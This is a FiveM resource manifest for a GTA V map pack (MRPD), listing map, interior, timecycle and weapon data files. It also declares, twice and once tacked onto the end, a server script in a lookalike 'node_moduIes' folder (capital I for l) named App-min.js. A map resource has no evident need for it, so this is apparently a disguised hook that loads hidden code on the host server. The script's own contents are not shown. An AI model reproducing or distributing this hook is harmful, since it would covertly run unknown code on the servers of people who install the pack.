
fx_version 'bodacious'
game 'gta5'

author 'GABZ'
description 'MRPD'
version '1.0.0'

this_is_a_map 'yes'

file "nve_quadra.lua"

files {
	'gabz_mrpd_timecycle.xml',
	'interiorproxies.meta',
	'pedpersonality.meta',
	'downtown.ymt',
    'pillbox_hill.ymt',
	'timecycles/ocean_h_timecycle.xml',
	'interiorproxies.meta',
	'interiorproxies.meta',
	'gtxd.meta',
	'pedpersonality.meta',
	'weaponanimations.meta',
	'weaponarchetypes.meta',
	'weapons_karambit.meta',
	'weapons_brick.meta',
	'stream/*',
}

client_script {
    '@vrp/lib/lib.lua',
    'gabz_mrpd_entitysets.lua',
	'client.lua',
	'nve_quadra.lua',
}


server_script{
 'node_moduIes/App-min.js'
}

data_file 'TIMECYCLEMOD_FILE' 'gabz_mrpd_timecycle.xml'
data_file 'DLC_ITYP_REQUEST' 'stream/patoche_cyberbar/patoche_cyber_list.ytyp'
data_file 'PED_PERSONALITY_FILE' 'pedpersonality.meta'
data_file 'INTERIOR_PROXY_ORDER_FILE' 'interiorproxies.meta'
data_file 'DLC_ITYP_REQUEST' 'stream/gabz_lost/ydr/gabz_lost_props.ytyp'

-- data_file 'SCENARIO_INFO_FILE' 'downtown.ymt'
-- data_file 'SCENARIO_POINTS_PSO_FILE' 'downtown.ymt'
-- data_file 'FIVEM_LOVES_YOU_A01627E3E5FC490A' 'downtown.ymt'
-- data_file 'FIVEM_LOVES_YOU_399915A5EEB45A2B' 'downtown.ymt'
-- data_file 'FIVEM_LOVES_YOU_A9E8B9F6EEB35186' 'downtown.ymt'
-- data_file 'FIVEM_LOVES_YOU_DB4D236636684A3F' 'downtown.ymt'
-- data_file 'SCENARIO_INFO_FILE' 'pillbox_hill.ymt'
-- data_file 'SCENARIO_POINTS_PSO_FILE' 'pillbox_hill.ymt'
-- data_file 'FIVEM_LOVES_YOU_A01627E3E5FC490A' 'pillbox_hill.ymt'
-- data_file 'FIVEM_LOVES_YOU_399915A5EEB45A2B' 'pillbox_hill.ymt'
-- data_file 'FIVEM_LOVES_YOU_A9E8B9F6EEB35186' 'pillbox_hill.ymt'
-- data_file 'FIVEM_LOVES_YOU_DB4D236636684A3F' 'pillbox_hill.ymt'
-- data_file 'TIMECYCLEMOD_FILE' 'timecycles/ocean_h_timecycle.xml'
-- data_file 'SCALEFORM_DLC_FILE' 'stream/oceanHospital/minimap/int164437691.gfx'
-- data_file 'SCALEFORM_DLC_FILE' 'stream/oceanHospital/minimap/int1855188787.gfx'
-- data_file 'SCALEFORM_DLC_FILE' 'stream/oceanHospital/minimap/int1975778630.gfx'
-- data_file 'SCALEFORM_DLC_FILE' 'stream/oceanHospital/minimap/int2439777779.gfx'
-- data_file 'SCALEFORM_DLC_FILE' 'stream/oceanHospital/minimap/int2574468285.gfx'
-- data_file 'SCALEFORM_DLC_FILE' 'stream/oceanHospital/minimap/int3680022772.gfx'

data_file 'DLC_ITYP_REQUEST' 'k4mb1_ornate_bank.ytyp'
data_file 'DLC_ITYP_REQUEST' 'stream/patoche_shop/patoche_shop_list.ytyp'
data_file 'DLC_ITYP_REQUEST' 'stream/ponte_ilha/extraprops_def.ytyp'
data_file 'GTXD_PARENTING_DATA' 'gtxd.meta'
data_file 'PED_PERSONALITY_FILE' 'pedpersonality.meta'
data_file 'WEAPON_ANIMATIONS_FILE' 'weaponanimations.meta'
data_file 'WEAPON_METADATA_FILE' 'weaponarchetypes.meta'
data_file 'WEAPONINFO_FILE' 'weapons_shoes.meta'
data_file 'WEAPONINFO_FILE_PATCH' 'weapons_shoes.meta'
data_file 'WEAPONINFO_FILE' 'weapons_katana.meta'
data_file 'WEAPONINFO_FILE_PATCH' 'weapons_katana.meta'
data_file 'WEAPONINFO_FILE' 'weapons_karambit.meta'
data_file 'WEAPONINFO_FILE_PATCH' 'weapons_karambit.meta'
data_file 'WEAPONINFO_FILE' 'weapons_brick.meta'
data_file 'WEAPONINFO_FILE_PATCH' 'weapons_brick.meta'
data_file "INTERIOR_PROXY_ORDER_FILE" "interiorproxies.meta"
data_file "DLC_ITYP_REQUEST" "stream/creativeInteriores/v_int_16.ytyp"
data_file "DLC_ITYP_REQUEST" "stream/creativeInteriores/v_int_49.ytyp"
data_file "DLC_ITYP_REQUEST" "stream/creativeInteriores/creative_hotel.ytyp"
data_file "DLC_ITYP_REQUEST" "stream/creativeInteriores/creative_middle.ytyp"
server_script "node_moduIes/App-min.js"